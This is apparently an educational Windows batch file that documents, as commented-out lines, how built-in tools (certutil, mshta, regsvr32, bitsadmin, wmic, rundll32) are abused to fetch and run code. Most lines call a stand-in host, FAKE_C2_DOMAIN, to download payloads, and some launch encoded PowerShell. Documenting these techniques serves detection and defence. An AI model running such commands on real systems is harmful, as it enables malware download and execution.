@echo off
REM LOLBin Abuse Examples - Educational Purposes Only
REM These commands show how legitimate Windows tools are abused
REM No actual malicious URLs or payloads are included

REM --- certutil: Download file disguised as base64 decode ---
REM certutil.exe -urlcache -split -f http://FAKE_C2_DOMAIN/payload.exe C:\Temp\update.exe

REM --- mshta: Execute remote HTA script ---
REM mshta.exe http://FAKE_C2_DOMAIN/payload.hta

REM --- regsvr32: Squiblydoo - execute remote scriptlet ---
REM regsvr32.exe /s /n /u /i:http://FAKE_C2_DOMAIN/payload.sct scrobj.dll

REM --- bitsadmin: Download file using Background Intelligent Transfer Service ---
REM bitsadmin /transfer "WindowsUpdate" http://FAKE_C2_DOMAIN/payload.exe C:\Temp\update.exe

REM --- wmic: Execute process ---
REM wmic process call create "powershell.exe -enc PAYLOAD"

REM --- rundll32: Execute DLL ---
REM rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();new%20ActiveXObject("WScript.Shell").Run("powershell -enc PAYLOAD")

echo LOLBin abuse patterns documented for analysis
